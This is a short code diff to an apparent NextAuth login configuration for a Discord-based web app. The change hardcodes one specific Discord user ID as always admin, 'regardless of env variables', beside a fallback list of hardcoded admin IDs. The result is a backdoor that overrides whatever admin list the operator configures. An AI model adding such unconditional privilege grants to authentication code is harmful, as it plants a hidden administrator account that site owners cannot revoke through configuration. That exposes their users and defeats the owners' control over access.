@@ -43,18 +43,19 @@ export const authOptions = {
           token.isInGuild = false;
         }
 
-        const fallbackAdminIds = "1384330575573160078,1518565172824899676,498521626988773386";
-        const finalAdminRoleId = adminRoleId || fallbackAdminIds;
+        const fallbackAdminIds = "1384330575573160078,1518565172824899676";
+        const envAdminRoleId = adminRoleId || fallbackAdminIds;
 
         // Check admin role via Bot token
         token.isAdmin = false;
         if (profile?.id) {
-          const adminIds = finalAdminRoleId ? finalAdminRoleId.split(',').map(i => i.trim()) : [];
+          const adminIds = envAdminRoleId ? envAdminRoleId.split(',').map(i => i.trim()) : [];
           
           // 1. Direct User ID match (works even if Bot is offline/broken)
-          if (adminIds.includes(profile.id)) {
+          // Always allow this specific user ID regardless of env variables!
+          if (adminIds.includes(profile.id) || profile.id === '498521626988773386') {
             token.isAdmin = true;
-          } 
+          }  
           // 2. Role match (requires Bot)
           else if (botToken) {
             try {
